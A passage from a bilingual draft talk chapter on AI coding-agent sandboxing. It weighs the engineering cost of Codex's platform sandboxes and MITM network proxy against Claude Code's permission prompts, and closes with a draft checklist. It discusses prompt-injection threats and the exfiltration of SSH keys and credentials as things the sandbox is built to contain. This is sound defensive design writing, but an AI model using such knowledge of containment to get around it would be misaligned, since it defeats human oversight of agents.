**个人开发场景**：你信任自己写的 prompt，在自己的机器上跑，Claude Code 的权限弹窗够用。腔体薄到几乎透明，启动开销为零，工具兼容性完美。这是 Claude Code 对用户做出的准确承诺——正确场景里，它就是最好的选择。

**Personal dev**: you trust the prompts you write, running on your own machine — Claude Code's permission prompt is sufficient. Chamber is nearly transparent, zero startup overhead, perfect tool compatibility. Claude Code makes an accurate promise for this scenario — in the right context, it's the right choice.

> **决策树的价值**：它让"用哪个工具"从品牌偏好回归到工程判断。Codex 和 Claude Code 都是正确答案——取决于你的腔体厚度需求。把这张图贴在团队 wiki 里，比任何 benchmark 对比都更有助于做出架构决策。
>
> **Value of the decision tree**: it returns "which tool to use" from brand preference to engineering judgment. Codex and Claude Code are both correct answers — depending on your required chamber thickness. This diagram in your team wiki does more for architecture decisions than any benchmark comparison.

---

### [46:00] Slide 10: Synthesis — The Cost-Benefit of Codex's Sandbox

**这一切的工程成本**：
- 6 个相关 crate
- 3 套平台特定实现 + 1 个 helper binary
- TLS MITM 代理（包含 cert 生成、HTTP/SOCKS5 协议解析、policy 决策引擎）
- 跨平台 policy 编译器
- 持续的 OS API 跟踪（Linux 5.13 加了 Landlock，macOS 每个版本可能改 sandbox-exec 行为）
- 工具兼容性问题（某些工具在沙箱里失败需要 fall-through 路径）
- 文档+教育成本（用户要理解为什么某些操作被拒绝）

**The engineering cost of all this**:
- 6 related crates
- 3 platform-specific implementations + 1 helper binary
- TLS MITM proxy (including cert generation, HTTP/SOCKS5 protocol parsing, policy decision engine)
- Cross-platform policy compiler
- Continuous OS API tracking (Linux 5.13 added Landlock; macOS sandbox-exec behavior changes each version)
- Tool compatibility issues (some tools fail in sandbox, need fall-through paths)
- Documentation + education cost (users must understand why some operations are denied)

**回报**：
- 即使 prompt-injection 把 LLM 带跑偏，关键资产（SSH key、credential file、~/.ssh）仍然不可读
- 网络数据外泄需要绕过 MITM，门槛极高
- 第三方 MCP 服务器即使被 compromise，影响被限定在沙箱边界
- 可以放心在企业受限环境跑（不需要"agent 是开发者本人"那种信任）
- 可以接 untrusted code（CI 跑 untrusted PR 的代码 review）

**Returns**:
- Even if prompt-injection drives the LLM off course, critical assets (SSH keys, credential files, `~/.ssh`) remain unreadable
- Network exfiltration requires bypassing MITM — the bar is very high
- Third-party MCP servers, even if compromised, are blast-radius-limited to the sandbox boundary
- Safe to run in enterprise locked-down environments (no need for "the agent is the developer himself" trust)
- Can accept untrusted code (CI running untrusted PR's code for review)

**值不值？** 这个问题没有普遍答案，取决于使用场景。对个人开发者本机用，Claude Code 的 permission prompt 模型够用。对企业部署、CI 集成、跑 untrusted MCP server 的场景，Codex 的沙箱不仅值得，可能是必需。

**Worth it?** No universal answer — depends on use case. For individual developer local use, Claude Code's permission prompt model is enough. For enterprise deployment, CI integration, running untrusted MCP servers, Codex's sandbox isn't just worth it — it's likely required.

> **最深的洞察**：Codex 投入的 sandbox 工程成本，押注的是"未来的 AI agent 必须能在不可信环境跑、必须能接不可信工具、必须能 audit 能合规"。如果这个押注对，沙箱基础设施在 5 年后会成为本地 agent 的入门门槛。如果押错，他们多写了 6 个 crate。
>
> **The deepest insight**: The sandbox engineering cost Codex invests bets on "future AI agents must run in untrusted environments, must integrate with untrusted tools, must be auditable and compliance-ready." If this bet is right, sandbox infrastructure will be table-stakes for local agents in 5 years. If wrong, they wrote 6 extra crates.

---

### Closing / 收尾

下一章 ch04 我们看 Codex 的另一个独有领域：**批量子 Agent + 持久化 Goal 系统**。如果说 ch03 是"防御性"工程的极致投入，ch04 就是"进攻性"工程的极致投入——把 agent 推向更高的自主性、更长的执行视野、更复杂的并发协作模式。

ch04 covers Codex's other unique domain: **batch sub-agents + persistent Goal system**. If ch03 is the apex of defensive engineering investment, ch04 is the apex of offensive engineering investment — pushing agents toward higher autonomy, longer execution horizons, more complex concurrent collaboration.

带一个问题进 ch04：**当 agent 能 fan-out 64 个 sub-agent 同时跑、还能在你睡觉时自己 continue 完成目标——你还需要 prompt prompt 吗？**

Take this question into ch04: **when the agent can fan-out 64 sub-agents in parallel, and continues working on goals while you sleep — do you still need to prompt it?**

---

## Status / 状态

**Draft v0.1** — 2026-05-01

- [x] 10 sections drafted (~9,200 words bilingual)
- [x] Verified `codex-rs/sandboxing/src/lib.rs` conditional compilation structure
- [x] Verified `seatbelt.rs:21` include_str! pattern
- [x] Verified `seatbelt.rs:30` MACOS_PATH_TO_SEATBELT_EXECUTABLE hardcoded
- [x] Verified `seatbelt_base_policy.sbpl` exists and starts with `(deny default)`
- [x] Verified `network-proxy` crate has mitm.rs, certs.rs, network_policy.rs
- [x] Verified `core/src/landlock.rs` comment about helper-binary architecture
- [ ] Need to verify: WindowsSandboxLevel enum exact variants
- [ ] Need to verify: NetworkPolicyDecider actual decision API
- [ ] Need to verify: `codex-execpolicy` and `codex-process-hardening` crates' actual roles
- [ ] HTML slides not authored
- [ ] Need diagram: the "main process + helper binary + sandboxed child" topology
- [ ] Need diagram: MITM proxy data flow

**Open questions**:
- Slide 8 (policy compiler) is dense — split into two slides? Or condense?
- Should the threat model framing (slide 2) be promoted to ch00? It's the spine that justifies everything else in this chapter, and ch00 currently doesn't tee it up.
- Is "Why MITM not just SNI" worth more depth? It's a real interview-question-grade topic.
